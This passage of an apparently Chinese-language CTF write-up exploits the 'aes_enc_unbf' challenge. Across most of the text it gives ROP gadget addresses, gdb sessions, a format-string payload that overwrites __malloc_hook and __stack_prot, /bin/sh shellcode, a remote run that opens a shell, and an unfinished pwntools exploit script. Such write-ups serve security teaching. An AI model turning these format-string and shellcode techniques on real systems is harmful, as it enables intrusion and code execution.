+<p>参数a1应该为_libc_stack_end的地址了。_stack_prot通过rop修改为0x7即111b，这样的话stack就是可执行的了，然后就可以执行shellcode了。<br>直接search。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-033250.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_libc_stack_end &#x3D; 0x0822ECE8</span><br><span class="line">__stack_prot &#x3D; 0x0822EC98</span><br><span class="line">_dl_make_stack_executable &#x3D; 0x081715D0</span><br></pre></td></tr></table></figure></li>
+<li><p>malloc_hook<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-033601.png" alt=""></p>
+</li>
+<li><p>main<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-041310.png" alt=""></p>
+</li>
+<li><p>pop_eax</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~&#x2F;unbreakable_encryption$ ROPgadget --binary aes_enc_unbf --only &quot;pop|ret&quot;|grep eax</span><br><span class="line">0x0813ed14 : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0817b0ea : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0804c906 : pop eax ; ret</span><br><span class="line">0x0818f350 : pop eax ; ret 0xffe4</span><br><span class="line">0x0817b0e9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>
+<p>pop_eax = 0x0804c906</p>
+</li>
+<li><p>jmp_esp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~&#x2F;unbreakable_encryption$ ROPgadget --binary aes_enc_unbf --only &quot;jmp&quot;|grep esp</span><br><span class="line">0x08174bec : jmp esp</span><br></pre></td></tr></table></figure>
+<p>jmp_esp = 0x08174bec </p>
+</li>
+</ul>
+<h3 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h3><p>要确定偏移需要多次调试，没有什么好的方法。<br>这里我也是把已经调试好的偏移直接带入跟了一遍而已。<br>要在pwntools里用gdb调试，首先要先设置好断点文件，然后gdb.attach(r,open(filename))<br>得到断点文件的方法如下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b *0x8048d73</span><br><span class="line">Breakpoint 1 at 0x8048d73</span><br><span class="line">gef➤  save breakpoints filename</span><br></pre></td></tr></table></figure>
+<p>然后执行程序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:&#x2F;home&#x2F;sakura&#x2F;unbreakable_encryption# python exp.py 1</span><br><span class="line">[+] Starting local process &#39;.&#x2F;aes_enc_unbf&#39;: pid 25217</span><br><span class="line">debug?</span><br><span class="line">[*] X: 0x804</span><br><span class="line">[*] Y: 0x84dc</span><br><span class="line">[*] running in new terminal: &#x2F;usr&#x2F;bin&#x2F;gdb -q  &quot;&#x2F;home&#x2F;sakura&#x2F;unbreakable_encryption&#x2F;aes_enc_unbf&quot; 25217 -x &quot;&#x2F;tmp&#x2F;pwndl_JQG.gdb&quot;</span><br><span class="line">[+] Waiting for debugger: Done</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 1 at 0x8048d73</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">gef➤  si</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────────────────────────────────[ code:i386 ]────</span><br><span class="line">    0x81115cb &lt;__correctly_grouped_prefixmb+715&gt; jmp    0x8111578 &lt;__correctly_grouped_prefixmb+632&gt;</span><br><span class="line">    0x81115cd                  xchg   ax, ax</span><br><span class="line">    0x81115cf                  nop    </span><br><span class="line"> →  0x81115d0 &lt;printf+0&gt;       sub    esp, 0xc</span><br><span class="line">    0x81115d3 &lt;printf+3&gt;       lea    eax, [esp+0x14]</span><br><span class="line">    0x81115d7 &lt;printf+7&gt;       sub    esp, 0x4</span><br><span class="line">    0x81115da &lt;printf+10&gt;      push   eax</span><br><span class="line">    0x81115db &lt;printf+11&gt;      push   DWORD PTR [esp+0x18]</span><br><span class="line">    0x81115df &lt;printf+15&gt;      push   DWORD PTR ds:0x8230538</span><br></pre></td></tr></table></figure>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-155208.png" alt=""><br>printf执行完后，malloc_hook等于main函数的首地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x &#x2F;gx 0x08230598</span><br><span class="line">0x8230598 &lt;__malloc_hook&gt;:	0x0000000008048ce0</span><br></pre></td></tr></table></figure>
+<p>跳回main函数，为了确定跳回，先在main下个断点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b *0x08048CE0</span><br><span class="line">gef➤  c</span><br></pre></td></tr></table></figure>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-160953.png" alt=""><br>继续执行，断在printf</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  c</span><br><span class="line">gef➤  si # 我这里si的目的是步入printf，不过其实没什么用，不步入的话esp就不指向返回地址，而是格式化串本身。</span><br></pre></td></tr></table></figure>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-161430.png" alt=""><br><strong>注意hhn代表只覆盖单字节。</strong><br>这次printf结束之后,__stack_prot的值被修改为7。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;gx 0x0822EC98</span><br><span class="line">0x822ec98 &lt;__stack_prot&gt;:	0x0000000000000007</span><br></pre></td></tr></table></figure>
+<p>继续c还会再跳回main函数，因为malloc_hook还指向main函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">...</span><br><span class="line"> →  0x8048ce0 &lt;main+0&gt;         lea    ecx, [esp+0x4]</span><br><span class="line">    0x8048ce4 &lt;main+4&gt;         and    esp, 0xfffffff0</span><br><span class="line">    0x8048ce7 &lt;main+7&gt;         push   DWORD PTR [ecx-0x4]</span><br><span class="line">    0x8048cea &lt;main+10&gt;        push   ebp</span><br><span class="line">    0x8048ceb &lt;main+11&gt;        mov    ebp, esp</span><br><span class="line">    0x8048ced &lt;main+13&gt;        push   ecx</span><br></pre></td></tr></table></figure>
+<p>继续c，执行到printf,这次我不再步入printf里，所以esp就指向格式化串。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">gef➤  <span class="built_in">stack</span> <span class="number">60</span></span><br><span class="line"><span class="number">0xffffcfa0</span>│+<span class="number">0x00</span>: <span class="number">0xffffcfbc</span> 格式化字符串</span><br><span class="line"><span class="number">0xffffcfa4</span>│+<span class="number">0x04</span>: <span class="number">0xffffcfbc</span> offset <span class="number">1</span></span><br><span class="line"><span class="number">0xffffcfa8</span>│+<span class="number">0x08</span>: <span class="number">0x00000000</span> offset <span class="number">2</span></span><br><span class="line"><span class="number">0xffffcfac</span>│+<span class="number">0x0c</span>: <span class="number">0xffffffff</span> offset <span class="number">3</span></span><br><span class="line"><span class="number">0xffffcfb0</span>│+<span class="number">0x10</span>: <span class="number">0x00000000</span> offset <span class="number">4</span></span><br><span class="line"><span class="number">0xffffcfb4</span>│+<span class="number">0x14</span>: <span class="number">0x00000000</span> offset <span class="number">5</span></span><br><span class="line"><span class="number">0xffffcfb8</span>│+<span class="number">0x18</span>: <span class="number">0x0000000a</span> offset <span class="number">6</span></span><br><span class="line"><span class="number">0xffffcfbc</span>│+<span class="number">0x1c</span>: <span class="number">0x08230598</span> offset <span class="number">7</span></span><br><span class="line"><span class="number">0xffffcfc0</span>│+<span class="number">0x20</span>: <span class="number">0x08230599</span> offset <span class="number">8</span></span><br><span class="line"><span class="number">0xffffcfc4</span>│+<span class="number">0x24</span>: <span class="number">0x0823059a</span> offset <span class="number">9</span></span><br><span class="line"><span class="number">0xffffcfc8</span>│+<span class="number">0x28</span>: <span class="number">0x0823059b</span> offset <span class="number">10</span></span><br><span class="line"><span class="number">0xffffcfcc</span>│+<span class="number">0x2c</span>: <span class="string">"%240u%7$hhn%256u%8$hhn%512u%9$hhn%768u%10$hhnAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcfd0</span>│+<span class="number">0x30</span>: <span class="string">"u%7$hhn%256u%8$hhn%512u%9$hhn%768u%10$hhnAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcfd4</span>│+<span class="number">0x34</span>: <span class="string">"hhn%256u%8$hhn%512u%9$hhn%768u%10$hhnAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcfd8</span>│+<span class="number">0x38</span>: <span class="string">"256u%8$hhn%512u%9$hhn%768u%10$hhnAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcfdc</span>│+<span class="number">0x3c</span>: <span class="string">"%8$hhn%512u%9$hhn%768u%10$hhnAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcfe0</span>│+<span class="number">0x40</span>: <span class="string">"hn%512u%9$hhn%768u%10$hhnAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcfe4</span>│+<span class="number">0x44</span>: <span class="string">"12u%9$hhn%768u%10$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcfe8</span>│+<span class="number">0x48</span>: <span class="string">"9$hhn%768u%10$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcfec</span>│+<span class="number">0x4c</span>: <span class="string">"n%768u%10$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcff0</span>│+<span class="number">0x50</span>: <span class="string">"8u%10$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcff4</span>│+<span class="number">0x54</span>: <span class="string">"0$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcff8</span>│+<span class="number">0x58</span>: <span class="string">"nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcffc</span>│+<span class="number">0x5c</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffd000</span>│+<span class="number">0x60</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffd004</span>│+<span class="number">0x64</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffd008</span>│+<span class="number">0x68</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffd00c</span>│+<span class="number">0x6c</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd010</span>│+<span class="number">0x70</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd014</span>│+<span class="number">0x74</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd018</span>│+<span class="number">0x78</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd01c</span>│+<span class="number">0x7c</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd020</span>│+<span class="number">0x80</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd024</span>│+<span class="number">0x84</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd028</span>│+<span class="number">0x88</span>: <span class="string">"AAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd02c</span>│+<span class="number">0x8c</span>: <span class="string">"AAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd030</span>│+<span class="number">0x90</span>: <span class="string">"AAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd034</span>│+<span class="number">0x94</span>: <span class="string">"AAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd038</span>│+<span class="number">0x98</span>: <span class="number">0x00414141</span> (<span class="string">"AAA"</span>?)</span><br><span class="line"><span class="number">0xffffd03c</span>│+<span class="number">0x9c</span>: <span class="number">0x12cda400</span> #<span class="meta"># canary ##</span></span><br><span class="line"><span class="number">0xffffd040</span>│+<span class="number">0xa0</span>: <span class="number">0x42424242</span></span><br><span class="line"><span class="number">0xffffd044</span>│+<span class="number">0xa4</span>: <span class="number">0xffffd04c</span>  →  <span class="number">0x0822ece8</span>  →  <span class="number">0xffffd6bc</span>  →  <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0xffffd048</span>│+<span class="number">0xa8</span>: <span class="number">0x0804c906</span>  →  &lt;EVP_CIPHER_CTX_key_length+<span class="number">6</span>&gt; pop eax	 ← $ebp</span><br><span class="line"><span class="number">0xffffd04c</span>│+<span class="number">0xac</span>: <span class="number">0x0822ece8</span>  →  <span class="number">0xffffd6bc</span>  →  <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0xffffd050</span>│+<span class="number">0xb0</span>: <span class="number">0x081715d0</span>  →  &lt;_dl_make_stack_executable+<span class="number">0</span>&gt; push esi</span><br><span class="line"><span class="number">0xffffd054</span>│+<span class="number">0xb4</span>: <span class="number">0x08174bec</span>  →  &lt;____strtof_l_internal+<span class="number">7900</span>&gt; jmp esp</span><br><span class="line"><span class="number">0xffffd058</span>│+<span class="number">0xb8</span>: <span class="number">0x6850c031</span> #<span class="meta"># shellcode ##</span></span><br><span class="line"><span class="number">0xffffd05c</span>│+<span class="number">0xbc</span>: <span class="number">0x68732f2f</span></span><br><span class="line"><span class="number">0xffffd060</span>│+<span class="number">0xc0</span>: <span class="number">0x69622f68</span></span><br><span class="line"><span class="number">0xffffd064</span>│+<span class="number">0xc4</span>: <span class="number">0x5950506e</span></span><br><span class="line"><span class="number">0xffffd068</span>│+<span class="number">0xc8</span>: <span class="number">0x6ae3895a</span></span><br><span class="line"><span class="number">0xffffd06c</span>│+<span class="number">0xcc</span>: <span class="number">0x5034585b</span></span><br><span class="line"><span class="number">0xffffd070</span>│+<span class="number">0xd0</span>: <span class="number">0x000080cd</span></span><br><span class="line"><span class="number">0xffffd074</span>│+<span class="number">0xd4</span>: <span class="number">0x080481c8</span>  →  &lt;_init+<span class="number">0</span>&gt; push ebx</span><br></pre></td></tr></table></figure>
+<p>printf执行完成后，malloc_hook已经恢复为0,不再会跳回main了，另外可以看出我们的leak出的canary和shellcode已经写入了栈里，实现了栈溢出。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x &#x2F;gx 0x08230598</span><br><span class="line">0x8230598 &lt;__malloc_hook&gt;:	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>当main函数执行结束，要ret的时候，就返回到我们布置好的利用链里。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0xffffd048│+0x00: 0x0804c906  →  &lt;EVP_CIPHER_CTX_key_length+6&gt; pop eax	 ← $esp</span><br><span class="line">0xffffd04c│+0x04: 0x0822ece8  →  0xffffd6bc  →  0x00000000	 ← $ecx</span><br><span class="line">0xffffd050│+0x08: 0x081715d0  →  &lt;_dl_make_stack_executable+0&gt; push esi</span><br><span class="line">0xffffd054│+0x0c: 0x08174bec  →  &lt;____strtof_l_internal+7900&gt; jmp esp</span><br><span class="line">0xffffd058│+0x10: 0x6850c031</span><br><span class="line">0xffffd05c│+0x14: 0x68732f2f</span><br><span class="line">0xffffd060│+0x18: 0x69622f68</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-164412.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$eax   : 0x0822ece8  →  0xffffd6bc  →  0x00000000</span><br></pre></td></tr></table></figure>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-164523.png" alt=""><br>栈可执行打开,并跳入shellcode执行。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-164623.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">→ 0xffffd070                  int    0x80</span><br></pre></td></tr></table></figure>
+<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-164825.png" alt=""></p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>exp来源<a href="https://github.com/phieulang1993/ctf-writeups/blob/master/2018/pragyan/aes_enc_unbf/aes_enc_unbf.py" target="_blank" rel="noopener">phieulang1993</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~&#x2F;unbreakable_encryption$ vim exp.py </span><br><span class="line">sakura@ubuntu:~&#x2F;unbreakable_encryption$ python exp.py 2</span><br><span class="line">[+] Opening connection to 128.199.224.175 on port 33100: Done</span><br><span class="line">[*] X: 0x804</span><br><span class="line">[*] Y: 0x84dc</span><br><span class="line">[*] \x98�\x9a\x05\x98\x05%7$n%2040x%8$hn%34012x%9$hnXXXX|%39$p|%41$p|YYYY</span><br><span class="line">[*] canary: 0xd7f0b100</span><br><span class="line">[*] stack: 0xffd88bb0</span><br><span class="line">[*] \x98�%259u%7$hhn</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Your message is :- </span><br><span class="line">\x98\x05\x99\x05\x9a\x05\x9b\x05                                                                                                                                                                                                                                      4292380012                                                                                                                                                                                                                                                               0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      4294967295                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line"></span><br><span class="line">$ </span><br><span class="line"></span><br><span class="line"> The encrypted message for the given plaintext is :- </span><br><span class="line">0000 - c5 27 69 67 81 b4 d5 26-dc ad 96 83 82 d5 c2 9c   .&#39;ig...&amp;........</span><br><span class="line">0010 - b7 62 f0 37 04 b8 7f 63-8a 21 2c 23 51 42 5d d2   .b.7...c.!,#QB].</span><br><span class="line">0020 - c5 71 36 e2 ce 57 59 5c-1b 1b 3d 1e 23 69 65 a3   .q6..WY\..&#x3D;.#ie.</span><br><span class="line">0030 - 0e 20 af 87 59 5c 50 eb-c7 64 5e 9c 72 ef ed df   . ..Y\P..d^.r...</span><br><span class="line">0040 - ef 96 47 d8 c6 7f 44 4d-e7 8e 38 ee f2 10 af 95   ..G...DM..8.....</span><br><span class="line">0050 - 3e 72 7b 42 84 54 72 55-c5 27 9c c4 02 28 51 79   &gt;r&#123;B.TrU.&#39;...(Qy</span><br><span class="line">0060 - 68 f1 3b 20 70 11 ab f6-12 c9 49 2c 4d 6c 92 f4   h.; p.....I,Ml..</span><br><span class="line">0070 - 5d 69 bd 24 79 8d ad ff-c2 eb ad 4d e0 65 1e f1   ]i.$y......M.e..</span><br><span class="line"></span><br><span class="line">Decrypted text is:</span><br><span class="line">\x98\x05\x99\x05\x9a\x05\x9b\x05%240u%7$hhn%256u%8$hhn%512u%9$hhn%768u%10$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line"></span><br><span class="line">$ ls</span><br><span class="line">core</span><br><span class="line">iv.aes</span><br><span class="line">key.aes</span><br><span class="line">x.out</span><br><span class="line">$ cat *.aes</span><br><span class="line">IV&#123;212&amp;5^V!-!&#125;IV</span><br><span class="line">BEGIN-KEY&#123;4x@$^%&#96;w~d##*9&#125;END-KEY</span><br></pre></td></tr></table></figure>
+<p>解密AES得到flag为pctf{th4t_m0m3n1-wh3n~f0rm41`SpiLls_0v3r}</p>
+<h2 id="其他exp-todo"><a href="#其他exp-todo" class="headerlink" title="其他exp(todo)"></a>其他exp(todo)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p = remote("128.199.224.175", 33000)</span></span><br><span class="line">p = process(<span class="string">"./aes_enc_unbf"</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = <span class="number">0x08230598</span></span><br><span class="line">main = <span class="number">0x8048ce0</span></span><br><span class="line">start = <span class="number">0x8048796</span></span><br><span class="line">free_hook = <span class="number">0x082345f0</span></span><br><span class="line">int_80 = <span class="number">0x810fb5e</span></span><br><span class="line">binsh_poi = <span class="number">0x8234ec4</span></span><br><span class="line">bss = <span class="number">0x8234ecc</span></span><br><span class="line">test_poi = <span class="number">0x8048c6a</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x080487f8</span></span><br><span class="line">nop = <span class="number">0x0804fe2f</span></span><br><span class="line">pop_eax = <span class="number">0x0804c906</span></span><br><span class="line">pop_ebx = <span class="number">0x080ed07f</span></span><br><span class="line">pop_ecx = <span class="number">0x081b9a41</span></span><br><span class="line">pop_edx = <span class="number">0x08068212</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = []</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;free_hook: main&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;binsh_poi: <span class="number">0x6e69622f</span>&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;binsh_poi+<span class="number">4</span>: <span class="number">0x0068732f</span>&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">4</span>: pop_eax&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">8</span>:  <span class="number">0xc</span>&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">12</span>: pop_ebx&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">16</span>: binsh_poi&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">20</span>: pop_ecx&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">24</span>: <span class="number">0x0</span>&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">28</span>: pop_edx&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">32</span>: <span class="number">0x0</span>&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">36</span>: int_80&#125;))</span><br><span class="line"></span><br><span class="line">t1 = <span class="string">"%&#123;&#125;c%42$n"</span>.format(bss)</span><br><span class="line">t2 = fmtstr_payload(<span class="number">7</span>, &#123;free_hook: <span class="number">0x0</span>&#125;)</span><br><span class="line"></span><br><span class="line">e = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line"></span><br><span class="line">    p.sendline(i)</span><br><span class="line">    <span class="keyword">print</span> 